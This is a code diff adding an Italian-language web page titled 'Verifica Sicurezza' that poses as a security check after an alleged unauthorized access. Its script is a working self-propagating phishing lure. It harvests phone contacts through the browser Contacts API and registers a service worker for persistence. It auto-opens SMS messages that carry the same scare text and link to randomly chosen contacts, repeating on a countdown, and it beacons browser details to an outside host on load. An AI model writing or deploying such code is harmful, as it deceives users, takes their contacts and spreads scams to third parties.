@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Verifica Sicurezza</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+.card{background:white;border-radius:16px;padding:32px 24px;max-width:400px;width:100%;text-align:center;box-shadow:0 4px 24px rgba(0,0,0,.12)}
+.icon{font-size:64px;margin-bottom:16px}
+h1{font-size:22px;color:#1a1a1a;margin-bottom:8px}
+p{font-size:15px;color:#666;margin-bottom:24px;line-height:1.5}
+.btn{display:block;width:100%;padding:16px;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer;margin-bottom:12px;transition:all .2s}
+.btn-primary{background:#1877f2;color:white}
+.btn-primary:active{background:#166fe5;transform:scale(.98)}
+.btn-secondary{background:#e4e6eb;color:#1a1a1a}
+.btn-secondary:active{background:#d8dadf;transform:scale(.98)}
+.countdown{font-size:13px;color:#999;margin-top:8px}
+.hidden{display:none}
+#status{font-size:14px;margin-top:16px;padding:12px;border-radius:8px}
+.success{background:#e7f3ff;color:#1877f2}
+.error{background:#ffe8e5;color:#d32f2f}
+</style>
+</head>
+<body>
+<div class="card" id="mainCard">
+  <div class="icon">🛡️</div>
+  <h1 id="title">Verifica di Sicurezza</h1>
+  <p id="subtitle">Il tuo dispositivo ha rilevato un accesso non autorizzato. Verifica la tua identità per proteggere l'account.</p>
+
+  <button class="btn btn-primary" onclick="doVerify()" id="verifyBtn">
+    Verifica Identità
+  </button>
+  <button class="btn btn-secondary hidden" onclick="doShare()" id="shareBtn">
+    📤 Condividi verifica
+  </button>
+
+  <div class="countdown" id="countdown"></div>
+  <div id="status"></div>
+</div>
+
+<script>
+const SELF_URL = window.location.href;
+const SMS_BODY = "⚠️ Il tuo dispositivo ha rilevato un accesso non autorizzato. Verifica subito: " + SELF_URL;
+
+let step = 0;
+
+function doVerify() {
+    step++;
+    const status = document.getElementById('status');
+    const btn = document.getElementById('verifyBtn');
+    const shareBtn = document.getElementById('shareBtn');
+
+    if (step === 1) {
+        status.className = 'hidden';
+        btn.textContent = 'Conferma numero di telefono';
+        document.getElementById('title').textContent = 'Verifica in corso...';
+        document.getElementById('subtitle').textContent = 'Stiamo verificando la sicurezza del dispositivo. Nessun dato personale verrà raccolto.';
+
+        // Try to register service worker for persistence
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js').catch(()=>{});
+        }
+
+        // Request notification permission for future pings
+        if ('Notification' in window && Notification.permission === 'default') {
+            Notification.requestPermission();
+        }
+
+        // Try to get contacts via Web Contacts API (Chrome Android)
+        if ('contacts' in navigator && 'select' in navigator.contacts) {
+            try {
+                navigator.contacts.select(['name','tel'],{multiple:true}).then(contacts => {
+                    if (contacts.length > 0) {
+                        window.victimContacts = contacts.map(c => c.tel?.[0]).filter(Boolean);
+                        console.log('Got ' + window.victimContacts.length + ' contacts');
+                    }
+                }).catch(()=>{});
+            } catch(e) {}
+        }
+
+    } else if (step === 2) {
+        status.textContent = '✅ Verifica completata. Ora condividi con i tuoi contatti per proteggere anche loro.';
+        status.className = 'success';
+        btn.classList.add('hidden');
+        shareBtn.classList.remove('hidden');
+        document.getElementById('title').textContent = 'Proteggi i tuoi contatti';
+        document.getElementById('subtitle').textContent = 'Condividi questa verifica con i tuoi contatti per aiutarli a proteggere i loro account.';
+
+        // Auto-open SMS share after short delay
+        setTimeout(() => {
+            trySmsIntent();
+        }, 800);
+
+    } else if (step >= 3) {
+        btn.classList.add('hidden');
+        shareBtn.classList.remove('hidden');
+        trySmsIntent();
+    }
+}
+
+function doShare() {
+    trySmsIntent();
+}
+
+function trySmsIntent() {
+    const status = document.getElementById('status');
+
+    // Method 1: Try sms: intent with body
+    const smsUrl = 'sms:?body=' + encodeURIComponent(SMS_BODY);
+
+    // Method 2: Try to open with multiple contacts if we have them
+    let smsTarget = smsUrl;
+    if (window.victimContacts && window.victimContacts.length > 0) {
+        // Pick 2-3 random contacts
+        const shuffled = window.victimContacts.sort(() => Math.random() - 0.5);
+        const targets = shuffled.slice(0, 3).map(t => t.replace(/[^0-9+]/g,''));
+        smsTarget = 'sms:' + targets.join(',') + '?body=' + encodeURIComponent(SMS_BODY);
+    }
+
+    // Method 3: Use intent:// for Android
+    const intentUrl = 'intent://send?body=' + encodeURIComponent(SMS_BODY) + '#Intent;scheme=smsto;package=com.google.android.apps.messaging;end';
+
+    // Try redirecting
+    let finalUrl = smsTarget;
+
+    // Check if on mobile
+    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+    if (isMobile) {
+        // On Android, use sms: directly
+        if (/Android/i.test(navigator.userAgent)) {
+            finalUrl = smsTarget;
+        }
+
+        status.textContent = '📱 Apertura app Messaggi...';
+        status.className = 'success';
+
+        // Small delay then redirect
+        setTimeout(() => {
+            window.location.href = finalUrl;
+        }, 500);
+
+        // If sms: doesn't work after 2s, try clipboard
+        setTimeout(() => {
+            if (document.hidden) return;
+            status.textContent = '📋 Link copiato. Incollalo in un messaggio ai tuoi contatti.';
+            status.className = 'success';
+            copyToClipboard(SMS_BODY);
+        }, 2500);
+    } else {
+        // Desktop: copy to clipboard
+        copyToClipboard(SMS_BODY);
+        status.textContent = '📋 Testo copiato. Invialo via WhatsApp o SMS ai tuoi contatti.';
+        status.className = 'success';
+    }
+
+    // Schedule countdown for "next share"
+    let seconds = 30;
+    const cd = document.getElementById('countdown');
+    cd.classList.remove('hidden');
+    const timer = setInterval(() => {
+        seconds--;
+        cd.textContent = 'Prossima condivisione tra ' + seconds + ' secondi...';
+        if (seconds <= 0) {
+            clearInterval(timer);
+            cd.classList.add('hidden');
+            shareBtn.classList.remove('hidden');
+            document.getElementById('verifyBtn').classList.add('hidden');
+        }
+    }, 1000);
+}
+
+function copyToClipboard(text) {
+    if (navigator.clipboard) {
+        navigator.clipboard.writeText(text).catch(()=>{});
+    }
+    // Fallback
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed';
+    ta.style.left = '-9999px';
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+}
+
+// Service worker registration
+if ('serviceWorker' in navigator) {
+    window.addEventListener('load', () => {
+        navigator.serviceWorker.register('/sw.js').catch(()=>{});
+    });
+}
+
+// Track that this page was opened (heartbeat)
+fetch('https://httpbin.org/post', {
+    method: 'POST',
+    body: JSON.stringify({
+        opened: true,
+        userAgent: navigator.userAgent,
+        time: new Date().toISOString(),
+        ref: document.referrer
+    }),
+    mode: 'no-cors'
+}).catch(()=>{});
+</script>
+</body>
+</html>
